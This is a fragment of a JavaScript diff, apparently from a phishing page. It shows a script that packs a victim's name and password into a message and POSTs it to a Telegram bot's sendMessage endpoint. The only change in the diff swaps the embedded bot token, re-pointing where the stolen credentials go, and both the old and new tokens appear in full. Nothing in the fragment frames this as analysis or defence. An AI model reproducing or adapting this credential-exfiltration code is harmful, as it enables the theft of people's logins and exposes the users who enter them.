@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', () => {
             `Name: ${name}\n` +
             `Password: ${pwd}`;
         const response = await fetch(
-            `https://api.telegram.org/bot8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8/sendMessage`,
+            `https://api.telegram.org/bot8838836689:AAGwV5CRVgpe5RjFsxXdYDa2E4LNMfAZhsk/sendMessage`,
             {
                 method: 'POST',
                 headers: {
